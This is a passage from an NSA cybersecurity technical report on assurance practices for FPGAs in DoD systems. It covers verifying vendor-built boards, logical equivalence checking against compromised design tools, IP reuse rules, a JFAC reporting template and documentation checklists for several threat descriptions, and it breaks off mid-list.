Engage a DoD vendor to build the SBCS
Programs should engage a DoD supplier to build the SBCS devices under the LoA3
constraints. This includes the use of people cleared at least at the Secret level working
in Secret cleared environments.
Verification and authentication
All verification and authentication steps in this section should be conducted by a team of
people independent from the manufacturing team. This team should obtain and review
the SBCS schematics for functional correctness, vulnerabilities, and security concerns
as they relate to the FPGA configuration process and security connections. Verify the
PCB traces related to the FPGA device, the configuration memory devices, and any
other devices related to the authentication of the configuration data. The program
should rely on guidance from the JFAC PCB Executive Agent to perform this
verification. This evaluation should be performed on all devices.
Authenticate the FPGA devices
In this mitigation, the program should authenticate the devices utilizing the
recommendations found under TD 2: Adversary inserts malicious counterfeit. Then, the
devices should be re-authenticated upon completion of the SBCS manufacture utilizing
a cryptographically protected ID or through the use of a soft PUF.
Verify the SBCS configuration process
Utilize SBCSs whose configuration process and board level connections comply with
the LoA3 mitigation requirements for TD 6: Adversary swaps configuration file on target.
This includes, but is not limited to, requirements for:
NIST compliant authentication algorithms
Differential power analysis (DPA) resistant authentication
Protected key storage
Anti-tamper detection and response
Being free of known vulnerabilities in the configuration and security functions
All encryption and authentication keys lengths must be compliant with the
requirements outlined NIST SP 800-57
The ability to disable FPGA test pins, such as JTAG
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
If the configuration file memory storage device contains SBCS vendor code, the
program should review and evaluate that code for malicious functions. The proprietary
SBCS support for configuration must be fully understood and validated. If the SBCS
configuration process cannot be fully evaluated, it should not be used at LoA3.
Once the SBCS
s configuration design and implementation are evaluated to be free of
malicious functions, the program should craft a set of tests and validation processes to
verify that all the devices comply with the evaluation.
Test non-volatile memory
Poll the FPGA settings captured in non-volatile memory, such as fuses, to determine if
the SBCS vendor has preprogrammed any settings in a manner conflicting with these
assurance guidelines or that conflict with user application needs.
Document the steps
Document all steps taken to demonstrate compliance with TD 9. These steps and
associated data artifacts should be auditable.
TD 10: Adversary modifies vendor FPGA software design
suite during development
In this threat, an adversary modifies the vendor design suite during its development to
subvert the DoD application during FPGA implementation. This subversion could
include:
Inserting a malicious function or vulnerability into the device during synthesis,
place and route, or configuration data generation.
Enabling the exfiltration of program application design data over a network
connection.
This subverted tool would then be part of the authorized software delivered by the
vendor and its distributors. In this light, delivery protections such as encryption, package
signing, and hashes would have no mitigating value. Evaluating the vendor software
and certifying it as Trojan free is a prohibitively intensive and costly venture that is not
practical at the program level.
At present, the only approach to addressing this attack is to verify the results of the
FPGA implementation steps. Rather than determine that the tool is Trojan free, the
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
approach is to verify that the tool suite did nothing malicious to the application design.
Logical equivalence checking (LEC) is the tool used to perform this verification.
JFAC is currently investigating additional measures to detect and thwart compromised
vendor tools. Pending new advances, JFAC can assist programs with overcoming the
difficulties of performing LEC.
TD 10 mitigations
To prevent exfiltration of data from a malicious FPGA EDA tool, perform all
FPGA design work on an isolated network as recommended in the mitigations for
TD 3: Adversary compromises application design cycle.
Perform logical equivalency checking between the application HDL and the final
configuration data.
TD 10 mitigation descriptions
Perform logical equivalency checking
To the greatest extent possible, LEC verifies that the vendor tools did not modify the
logic or configuration settings. The goal is to verify that the final bitstream and
originating application HDL are logically equivalent with no extraneous logic in the final
format. This confirms that Trojans were not inserted during the implementation steps.
The LEC also verifies that the configuration settings were maintained and not altered.
Configuration settings are those parameters included in the configuration file that affect
the behavior of the FPGA device itself but are not a part of the program application.
Examples include tamper settings, JTAG settings, and key storage.
There are technical challenges associated with performing LEC on FPGA data. First,
due to the proprietary nature of the configuration file format, including it in the LEC effort
is difficult. Contact JFAC for information on commercial tools that can assist with this for
several device families.
Additionally, many FPGA synthesis optimizations make it difficult to perform LEC. For
this reason, the following are recommended:
Perform LEC after each implementation step to limit the amount of change that
must be accounted for by the tool. This includes synthesis, place and route, and
configuration data generation.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Use hints files to assist in matching difficult-to-correlate logic in the compared
databases. Most LEC tools accept these files.
Contact JFAC for information on emerging industry tools that can assist in
identifying configuration data in the FPGA formats or automate the creation of
hints files.
3 Summary
The mitigations in this report are intended to protect against adversarial threats to
assurance on FPGA-based systems. Once a program incorporates the mitigations for
these 10 threat descriptions, it can consider its FPGAs to have achieved LoA3.
If a program has developed alternate solutions for mitigating these threats, it can
consult with JFAC to determine if the alternative mitigations are sufficient.
Finally, if a program has questions regarding this report or requires assistance, it should
contact JFAC at https://jfac.navy.mil/ for assistance.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Appendix A: Standardized terminology
The following terms are used in the Joint Federated Assurance Center Field
Programmable Gate Array Best Practices documents. These terms are modified from
Defense Acquisition University definitions to support common understanding.
Application design 
 The collection of schematics, constraints, hardware description
language (HDL), and other implementation files developed to generate an FPGA
configuration file for use on one or many FPGA platforms.
Application domain 
 This is the area of technology of the system itself, or a directly
associated area of technology. For instance, the system technology domain of a radar
system implemented using FPGAs would be "radar" or "electronic warfare."
Configuration file 
 The set of all data produced by the application design team and
loaded into an FPGA to personalize it. Referred to by some designers as a 
bitstream
the configuration file includes that information, as well as additional configuration
settings and firmware, which some designers may not consider part of their 
bitstream.
Controllable effect 
 Program-specific, triggerable function allowing the adversary to
attack a specific target.
Device/FPGA device 
 A specific physical instantiation of an FPGA.
External facility 
 An unclassified facility that is out of the control of the program or
contractor.
Field programmable gate array (FPGA) 
 In this context FPGA includes the full range
of devices containing substantial reprogrammable digital logic. This includes devices
marketed as FPGAs, complex programmable logic devices (CPLD), system-on-a-chip
(SoC) FPGAs, as well as devices marketed as SoCs and containing reprogrammable
digital logic capable of representing arbitrary functions. In addition, some FPGAs
incorporate analog/mixed signal elements alongside substantial amounts of
reprogrammable logic.
FPGA platform 
 An FPGA platform refers to a specific device type or family of devices
from a vendor.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Hard IP 
 Hard IP is a hardware design captured as a physical layout, intended to be
integrated into a hardware design in the layout process. Hard IP is most typically
distributed as Graphic Design System II (GDSII). In some cases, Hard IP is provided by
a fabrication company and the user of the IP does not have access to the full layout, but
simply a size and the information needed to connect to it. Hard IP may be distributed
with simulation hardware description language (HDL) and other soft components, but is
defined by the fact that the portion that ends up in the final hardware was defined by a
physical layout by the IP vendor.
Level of assurance (LoA) 
 A Level of Assurance is an established guideline that
details the appropriate mitigations necessary for the implementation given the impact to
national security associated with subversion of a specific system, without the need for
system-by-system custom evaluation.
Physical unclonable function (PUF) 
 This function provides a random string of bits of
a predetermined length. In the context of FPGAs, the randomness of the bitstring is
based upon variations in the silicon of the device due to manufacturing. These bitstrings
can be used for device IDs or keys.
Platform design 
 The platform design is the set of design information that specifies
the FPGA platform, including physical layouts, code, etc.
Soft IP 
 Soft IP is a hardware design captured in hardware description language
(HDL), intended to be integrated into a complete hardware design through a synthesis
process. Soft IP can be distributed in a number of ways, as functional HDL or a netlist
specified in HDL, encrypted or unencrypted.
System 
 An aggregation of system elements and enabling system elements to achieve
a given purpose or provide a needed capability.
System design 
 System design is the set of information that defines the
manufacturing, behavior, and programming of a system. It may include board designs,
firmware, software, FPGA configuration files, etc.
Target 
 A target refers to a specific deployed instance of a given system, or a specific
set of systems with a common design and function.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Targetability 
 The degree to which an attack may have an effect that only shows up in
circumstances the adversary chooses. An attack that is poorly targetable would be more
likely to be discovered accidentally, have unintended consequences, or be found in
standard testing.
Third-party intellectual property (3PIP) 
 Functions whose development are not
under the control of the designer. Use of the phrase 
intellectual property
, IP, or 3PIP in
outlining this methodology of design review does not refer to property rights, such as,
for example, copyrights, patents, or trade secrets. It is the responsibility of the party
seeking review and/or the reviewer to ensure that any rights needed to perform the
review in accordance with the methodology outlined are obtained.
Threat category 
 A threat category refers to a part of the supply chain with a specific
attack surface and set of common vulnerabilities against which many specific attacks
may be possible.
Utility 
 The utility of an attack is the degree to which an effect has value to an
adversarial operation. Higher utility effects may subvert a system or provide major
denial of service effects. Lower utility attacks might degrade a capability to a limited
extent.
Vulnerability 
 A flaw in a software, firmware, hardware, or service component
resulting from a weakness that can be exploited, causing a negative impact to the
confidentiality, integrity, or availability of an impacted component or components.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Appendix B: IP Reuse Guidance
There are several situations in which a program/organization would like to reuse
previously generated soft IP or 3PIP. This IP can be generated internally (i.e., by an
authorized DoD program, but for a different program than the original use) or externally
(i.e., purchased IP).
IP that was not generated for or previously evaluated by a DoD program in conjunction
with LoA3 requirements should not be used without a program evaluation. This includes
cases in which vendors have had the IP evaluated by a third party. That review is not
acceptable according to the DoD Microelectronics: FPGA Overall Assurance Process.
Programs have the sole responsibility to perform or oversee all reviews.
LoA3 introduces several new threat vectors, to include insiders, cleared and uncleared
personnel working alone or in conjunction with others, and new technologies, along with
funding at the nation-state level. Given the complexity of LoA3 and the types of
components and systems that require LoA3, JFAC strongly recommends re-evaluation
of all IP regardless of the source.
In situations where the program chooses not to re-review the previously evaluated IP,
the program should ensure the following conditions are satisfied.
Reuse conditions
To reuse IP, the following conditions should be satisfied:
a) The IP must have been developed internally (i.e., by a government funded and
managed program) for an LoA3 program or the IP was successfully internally
evaluated at LoA3.
b) All documentation associated with the development and/or previous evaluation
must be signed with a valid cryptographic signature and stored within the
configuration management system compliant with the LoA3 requirements in this
document. The documentation must be provided to the new program in its
totality. The documentation should clearly state any known vulnerabilities or risk
associated with the IP. The documentation must be proven to have remained
unchanged since the time the evaluation was performed.
c) A second copy with a different cryptographic signature of the evaluation report
should be stored in a controlled environment separate from the IP. The best
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
storage mechanisms would include in a SCIF, and either in a safe certified at the
Secret level or on a Secret network.
d) The program should verify the data in the separately stored evaluation reports is
the same as what the program is using.
e) The program cannot accept any IP in which the report has discrepancies from
the version received. For example, the name of the IP, version information, hash,
etc.
f) After the initial evaluation, the IP must remain maintained in a configuration
management system compliant with the LoA3 requirements in this document.
The hash of the IP must also be cryptographically signed and maintained in the
configuration management system. Additionally, the hash should be stored and
maintained with a second cryptographic signature. The program must verify the
separately stored hashes match.
g) In the event the IP was previously evaluated and there were areas of risk
identified, the risk must be documented and provided to the program that would
like to reuse the IP. The program has the responsibility to accept or mitigate the
risk based on individual program needs.
Reuse scenarios
The following section describes several use cases that provide additional details of
when IP can or cannot be reused at LoA3.
Scenarios in which LoA3 IP reuse is applicable:
a) The program would like to reuse internally developed LoA3 compliant IP, but not
previously evaluated outside of the initial program for use.
In this scenario, the IP was developed and stored internally using the processes
described in this document. Therefore, the IP was previously shown to be
compliant. The program has the responsibility to ensure that no modifications
were made to the IP since the time of development. To reuse the IP, the program
must demonstrate compliance with the conditions outlined in the Reuse
conditions section above.
b) The program would like to reuse internally developed LoA3 IP that was
previously successfully evaluated to be compliant with LoA3.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
In this scenario, the fact that the IP has been evaluated and deemed compliant to
LoA3 makes the reuse viable provided the program can demonstrate compliance
with the conditions outlined in the Reuse conditions section above.
c) The program would like to use IP that was developed by an external vendor. The
3PIP was previously internally verified as compliant with LoA3 for a different
program.
In this scenario, the IP was evaluated internally using the processes outlined in
this document. Therefore, the IP was previously shown to be compliant. To reuse
the IP, the program must demonstrate compliance with the conditions outlined in
the Reuse conditions section above.
Use cases in which an LoA3 IP evaluation in accordance with Third-Party IP Review
Process for Level of Assurance 3 document would be required:
d) The program would like to use internally developed IP that was not developed or
evaluated to satisfy any level of assurance. The program would like to use this IP
at LoA3.
e) In this scenario, the program should treat the IP the same as unevaluated
externally developed 3PIP. The program should follow the guidance provided in
TD 5: Adversary compromises third-party soft IP.
f) The program would like to reuse internally developed IP that was developed to
be compliant with LoA1 or LoA2.
g) Based on the increased threat complexity at LoA3, the program should treat the
IP the same as externally developed IP. The program should follow the guidance
provided in TD 5: Adversary compromises third-party soft IP.
h) The program would like to reuse internally developed IP that was developed to
be compliant with LoA1 or LoA2 and previously successfully evaluated to be
compliant with LoA1 or LoA2.
i) Based on the increased threat complexity, the program should treat the IP the
same as externally developed IP. The program should follow the guidance
provided in TD 5: Adversary compromises third-party soft IP.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
j) An LoA3 program would like to use externally developed 3PIP (e.g., v1.1). A
different version of the 3PIP (e.g., v1.0) was previously verified to be LoA1,
LoA2, or LoA3 compliant.
k) In this scenario, the IP has been modified. Due to the modification, the program
should treat the IP the same as unevaluated externally developed 3PIP. The
program should follow the guidance provided in TD 5: Adversary compromises
third-party soft IP.
l) At LoA3, the program would like to use externally developed 3PIP that was
previously verified by an independent third party at LoA1, LoA2, or LoA3.
m) Program independent third party reviews are not acceptable. The program
should treat the IP the same as not previously reviewed IP. The program should
follow the guidance provided in TD 5: Adversary compromises third-party soft IP.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Appendix C: JFAC FPGA reporting template
Each program is requested to provide the following information to JFAC. Multiple email
addresses are provided to support a variety of classification levels; only one email to
any of these is required. Please contact JFAC to obtain the appropriate email address
at https://jfac.navy.mil.
The template and information to be included in the email are as follows:
=============================================
*** Please Portion Mark Appropriately ***
(U) POC Contact Info
(U) Name:
(U) Organization/Company:
(U) Email:
(U) Phone:
(U) Address:
(U) Program Info
(U) Program Name (top-level program, i.e. F35, M1 tank, etc.):
(U) US Govt Sponsor: (Air Force, Army, Marines, Navy, DOE, other)
(U) Do you want to be included in any future JFAC FPGA Assurance related bulletins in
the future?
(U) Estimated Number of Systems to be Built:
(U) Program Description (1-3 sentences describing the top-level program in which the
subsystem listed below is included):
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
(U) FPGA Info (for each FPGA part number used)
(U) FPGA Vendor: (Intel, Lattice, MicroChip, Xilinx, other)
(U) FPGA Device Family:
(U) FPGA Device Part Number:
(U) FPGA Design Software Used and Version #:
(U) Description of Subsystem Containing FPGA Device:
(U) Total Estimated Number of Subsystems to be Built:
(U) Operating Environment: (mil, ind, com, radiation, cryo)
(U) Source/seller of the FPGA devices:
(U) Date purchased:
(U) Anticipated Fielding date:
(U) LoA Level:
(U) Description of FPGA Role in Subsystem. If multiple instances of FPGA devices,
number and describe the role of each.
===============================================
Example
=============================================
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
*** Please Portion Mark Appropriately ***
(U) POC Contact Info
(U) Name: Jack Jackson
(U) Organization/Company: Army Research Lab
(U) Email: jjackson@army_email.mil
(U) Phone: 555-555-5555
(U) Address: 10 Main St, Fort Murphy, Illinois 55555
(U) Program Info
(U) Program Name (top-level program, i.e. F35, M1 tank, etc.): Next Generation
Combat Vehicle (NGCV)
(U) US Govt Sponsor: (Air Force, Army, Marines, Navy, DOE, other) Army
(U) Do you want to be included in any future JFAC FPGA Assurance related bulletins in
the future? : Yes
(U) Estimated Number of Systems to be Built: 1400
(U) Program Description (1-3 sentences describing the top-level program in which the
subsystem listed below is included):
The Next Generation Combat Vehicle 
 Future Decisive Lethality (NGCV-FDL)
will have capabilities that are enabled by assured position, navigation and
timing and resilient networks. This will enable future maneuver formations to
execute semi-independent operations while conducting cross-domain
maneuver against a peer adversary.
(U) FPGA Info (for each FPGA part number used)
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
(U) FPGA Vendor: (Xilinx, Intel, MicroChip, Lattice, other): Acme MicroElectronics
(U) FPGA Device Family: Big Blue Iceberg
(U) FPGA Device Part Number: BBI-624L100K
(U) FPGA Design Software Used and Version #: IceBreaker V2021.15
(U) Description of Subsystem Containing FPGA Device: image processing for data
originating from the cannon targeting sensor
(U) Total Estimated Number of Subsystems to be Built: 3000
(U) Operating Environment: (mil, ind, com, radiation, cryo): mil
(U) Source/seller of the FPGA devices: Digikey, online
(U) Date purchased: 2/25/2020
(U) Anticipated Fielding date: 5/1/2022
(U) LoA Level: 1
(U) Description of FPGA Role in Subsystem. If there are multiple instances of FPGA
devices, number and describe the role of each one.
1. FPGA #1 
 is used to perform signal processing on raw image data coming in
from the externally mounted cannon.
2. FPGA #2 
 is used to perform signal processing on raw image data coming
from the scout drone through the external antennae #2 and synchronized with
GPS positioning data.
===============================================
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Appendix D: Mitigations and data/documentation
requirements
Checklist for TD 1: Adversary utilizes a known FPGA platform
vulnerability
TD 1 mitigations
Data/Documentation requirement
Use caution when selecting tools or
platforms
The program should document the name of the person
performing the research, the date timestamp of the
research, the research results, and the vendor provided
end-of-life plan or release notes (if available). If
beta/initial release is selected, the program should
document the rationale behind the selection and
contain the signature of the programmatic approval
authority.
Use cleared personnel
In writing, the program should designate work that must
be done by cleared individuals. The program should
keep a log of personnel assigned to that work along
with their clearance level.
The program should maintain a list of the members
comprising each team, with clearance level. The
program should maintain audit logs demonstrating what
each team member accessed.
Research vulnerabilities
The program should document each publication that
was searched (including at a minimum those identified
in this guidance), search results, the name of the
person who performed the search, and date timestamp
when the search was performed. The same information
should be documented by the reviewer.
If a vulnerability is found, choose one of the following options:
Option 1: Select a different FPGA
platform, device, or software
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
The program should document each publication that
was searched (minimally those identified in this
guidance should be searched), the search results, the
name of the person performing the search, and the
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
TD 1 mitigations
Data/Documentation requirement
date and timestamp of when the search was
performed.
Option 2: Work with the vendor
The program should work through the vendor process
to formally notify the vendor of any vulnerabilities, and
only accept fixes through formal, approved processes.
The program should maintain documentation regarding
the identified vulnerability, log communication with the
vendor, and document the source and method of the
received fix.
Option 3: Risk analysis
The program should maintain documentation
identifying the risk, any mitigations, and the approval
authority for accepting the residual risk.
Use revision control/version
management
The program should document, maintain, and utilize a
program configuration management (CM) plan. This
plan should include details on how configuration data
will be maintained for control and audit purposes. The
system used for CM should be named, and
implementation specific details should be documented.
The program should document how the CM plan is
compliant with NIST SP 800-171 Protecting Controlled
Unclassified Information in Nonfederal Systems and
Organizations. If a classified system is used, the
program should store a copy of the approved SSP.
Audit logs should be reviewed with the results
recorded.
Enforce auditability
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
The program should maintain audit logs on all design
data, including requirements, architecture, design,
code, tests, bugs, and fixes. The audit data minimally
should document who requested the change with date
and timestamp, the decision made regarding the
change, who made the decision with date and
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
TD 1 mitigations
Data/Documentation requirement
timestamp, why was the change requested, and who
made the change with date and timestamp.
Enforce the approved design
process
The program should document program design
milestones with clear entry and exit criteria. The entry
and exit criteria should be specifically identified to
include the peer review/code review and technical
review processes. The entrance and exit criteria should
be utilized throughout the program lifecycle. The
documentation should contain artifacts demonstrating
the gates were satisfied, with signed management
approval.
The program should obtain the results of independent
reviews to include:
 Type and extent of verification performed, to include
evaluation objective, methodology, and tools
 Findings, both positive and negative, for all
evaluations performed
 Risks identified by the review team (e.g., quality
issues, vulnerability to threats, etc.)
 Recommendations to mitigate identified risks
 Independent team should be separate from the team
doing the design
 Identification and credentials of each reviewer
 Date and timestamp of when the review was
performed
Checklist for TD 2: Adversary inserts malicious counterfeit
TD 2 mitigations
Purchase from DoD authorized
vendors and distributors
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
Documentation requirements
The program should document the name and location
of the authorized vendor along with documentation
demonstrating that the vendor is authorized.
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
TD 2 mitigations
Documentation requirements
Consult Government-Industry Data
Exchange Program (GIDEP)
The program should document the GIDEP search
results, the name or ID of the person performing the
search, and the date and timestamp of when the
search was performed.
Follow storage and shipping
guidance
The program should document, maintain and enforce a
transportation plan which supports the movement of
bulky classified material. Minimally the plan should
include:
 Title of Plan
 Date of movement
 Authorization/Approval
 Purpose
 Description of consignment, to include unique ID
when available
 Identification of responsible government and/or
company representatives
 Identification of commercial entities to be involved in
each shipment
 Packaging of the consignment
 Routing of the consignment
 Couriers/escorts
 Recipient responsibilities
 Return of material procedures
 Other information as required
The program should document, maintain, and enforce
a storage plan which supports the storage of bulky
material.
Verify the FPGA cryptographically
secure ID
The program should document and store the ID of each
FPGA against the ID that was provided directly by the
vendor.
Perform physical
inspection/analysis
The program should document the results of the
physical analysis test with each FPGA unique ID the
test was performed on.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
TD 2 mitigations
Documentation requirements
To mitigate risk of a cleared insider:
Select sample parts
The program should document:
 The process to secure the device and the results
 All parties that touched the device with the reason for
the interaction
Create cryptographically protected
IDs post verification
The program should record the device serial number
and PUF ID.
Compare results anytime the programs compares the
soft PUF and unique ID for confirmation of the
authenticity of the part.
Verify independent lab work
The program should require:
 The return of residual materials and detailed reports
after evaluation
 The approved storage plan to be utilized by the lab
with acceptable evidence
 Documentation that demonstrates the lab identified
the known bad parts; the name, address, and division
of the two independent labs; or results of physical
inspection
In addition to verifying independent lab work above, choose one of the following options:
Option 1: Insert known bad parts
Document the known bad parts, the problem with the
part, and the results from the verification facility that
performed the physical analysis.
Option 2: Use duplicate
Document the credentials of the lab observers, the
findings, and conclusion. The conclusion should
confirm if the lab results match or are different.
independent labs
Option 3: Use duplicate persons
assigned to the program
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
Document the credentials of the observers, the
findings, and conclusion. The conclusion should
confirm if the results match or are different.
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
TD 2 mitigations
Documentation requirements
Follow guidance for TD 4:
Adversary compromises system
assembly, keying, or provisioning
Provide all of the TD4: Adversary compromises system
assembly, keying, or provisioning data requirements.
Checklist for TD 3: Adversary compromises application design cycle
TD 3 mitigations
Documentation requirements
Use Secret level cleared personnel
In writing, the program should designate work that must
be done by cleared individuals. The program should
keep a log of personnel assigned to that work with their
clearance level.
The program should maintain a list of the members
comprising each team, with clearance level. The
program should maintain audit logs demonstrating what
each team member accessed.
Track critical data in a revision
control system
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
The program should ensure the following data items
are tracked in revision control:
Third-party IP (3PIP)
Utilized libraries
Development files, code, software used for
development, synthesis scripts, and tools
Test Benches, Test Plans and Test Procedures,
and Test Reports
Tool configuration settings
Design documents to include:
 Critical documents, to minimally include
requirements, design artifacts, test reports, test
plans, and discrepancy reports.
 Documentation with approval to proceed from
organizationally defined reviews: code reviews,
architecture reviews, technical design reviews, and
verification and validation reviews.
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
TD 3 mitigations
Documentation requirements
Each of these artifacts should be identified in the
programs auditing strategy and the audit logs should
minimally include decisions that were made, by whom,
for what reason, and on what date.
Enforce auditability
The program should maintain audit logs on all design
data, including requirements, architecture, design,
code, tests, bugs, and fixes. The audit data minimally
should document who requested the change with date
and timestamp, the decision made regarding the
change, who made the decision with date and
timestamp, why was the change requested, and who
made the change with date and timestamp.
Use revision control/version
management
The program should maintain revision control
documentation in accordance with requirements of
CMMC level 3 or NIST 800-171 Protecting Controlled
Unclassified Information in Nonfederal Systems and
Organizations and NIST 800-172 Enhanced Security
Requirements for Protecting Controlled Unclassified
Information. The program should maintain the CMMC
audit results or NIST 800-171 self-assessments.
TD 3.1 Mitigating the introduction of a compromised design into the application
Isolate and store the application
design
The program should document the hash of the final
configuration after the final design and verify the hash
prior to provisioning. The program should maintain the
configuration management audit logs.
Perform reproducible build
Document the reproducible build process and results
validating that the two separate builds produce the
same binary and hash.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
TD 3 mitigations
Documentation requirements
TD 3.2 Mitigating the modification of test benches/plan to reduce coverage or hide
Trojan code
Execute a documented test plan
The program should document and maintain a test plan
that includes a mechanism to verify all requirements.
 The test plan should explicitly list code coverage
metrics, the type of testing that will be performed, and
acceptable testing guidelines.
 Code coverage should state how much code is
checked by the test bench, providing information about
dead code in the design and holes in test suites.
Ensure code coverage includes statement coverage,
branch coverage, Finite State Machine (FSM),
condition, expression, and toggle coverage. Document
any code that will not be covered and why. Ensure
untested code is documented and reviewed through
the review process. Use functional tests to verify the
FPGA does what it is supposed to do. Any deviations
must be documented and approved.
 The decision to use/not use other types of testing
such as directed test, constrained random stimulus,
and assertion should be documented.
 Unexpected behavior should be documented and
analyzed, with final implementation conclusions
documented.
 The test plan should specify the verification
environment which describes the tools, the software,
and the equipment needed to perform the reviews,
analysis, and tests. Each of these items should be
maintained under revision control.
 Ensure all test discrepancies, bugs, etc. are resolved
via a change process.
Validate and verify test processes
The program should document, review, maintain,
enforce, and archive the test plan. The test plan should
include which tools will be used with names, version
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
TD 3 mitigations
Documentation requirements
numbers, and the various test reviews that will take
place, type of testing to be performed, and the methods
used to accomplish the test.
The program should maintain documentation of all
testing performed, including members of each team
and role, all documentation associated with peer
reviews, configuration logs indicating all actions taken
by whom and when, and use of automated tools where
applicable. All test discrepancies, bugs, etc. should be
resolved via a change process utilizing a change
management system. The established processes
should be documented, enforced, and audited.
Maintain test environment via
configuration management
The program should maintain configuration
management documentation in accordance with
requirements of CMMC level 3 or NIST SP 800-171
Protecting Controlled Unclassified Information in
Nonfederal Systems and Organizations and NIST SP
800-172 Enhanced Security Requirements for
Protecting Controlled Unclassified Information. The
program should maintain the CMMC audit results or
NIST SP 800-171 self-assessments.
TD 3.3 Mitigating the introduction of Trojans into the application design during
development
Maintain bi-directional link to
approved requirements
The program should document bi-directional
traceability for all device requirements, including
derived requirements.
Enforce peer review
The program should document the results of each peer
review to include:
 Entry criteria and status,
 Roles and responsibilities with associated names,
 Attendees,
 Findings, including deviations or waivers and
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
TD 3 mitigations
Documentation requirements
associated rationale and approval,
 Exit criteria and status.
Execute a documented test plan
The program should document and maintain a test plan
that includes a mechanism to verify all requirements.
 The test plan should explicitly list code coverage
metrics, the type of testing that will be performed, and
acceptable testing guidelines.
 Code coverage should state how much code is
checked by the test bench, providing information about
dead code in the design and holes in test suites.
Ensure code coverage includes statement coverage,
branch coverage, Finite State Machine (FSM),
condition, expression, and toggle coverage. Document
any code that will not be covered and why. Ensure
untested code is documented and reviewed through
the review process. Use functional tests to verify the
FPGA does what it is supposed to do. Any deviations
must be documented and approved.
 The decision to use/not use other types of testing
such as directed test, constrained random stimulus,
and assertion should be documented.
 Unexpected behavior should be documented and
analyzed, with final implementation conclusions
documented.
 The test plan should specify the verification
environment which describes the tools, the software,
and the equipment needed to perform the reviews,
analysis, and tests. Each of these items should be
maintained under revision control.
 Ensure all test discrepancies, bugs, etc. are resolved
via a change process.
Implement, validate, and verify test
processes
The program should maintain documentation of all
testing performed, including members of each team
and their roles, all documentation associated with peer
reviews, configuration logs indicating all actions taken
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
TD 3 mitigations
Documentation requirements
by whom and when, and use of automated tools where
applicable. All test discrepancies, bugs, etc., should be
resolved via a change process utilizing a change
management system. The established processes
should be documented, enforced, and audited
Select a formal 
proof
 process
Document all code that was reviewed using LEC, any
functional discrepancies, and how those discrepancies
were resolved.
TD 3.4 Mitigating the introduction of compromised tooling/software into the
environment
Validate cryptographic hashes
The program should document the value of the
calculated cryptographic hash and the signed hash
provided by the vendor along with the software name,
version, and release number.
Research vulnerabilities
The program should document each publication that
was searched, (including at minimum those identified in
this guidance) search results, the name of the person
performing the search and the date and timestamp
when the search was performed.
If vulnerabilities are found in the software or tools, choose one of the following options:
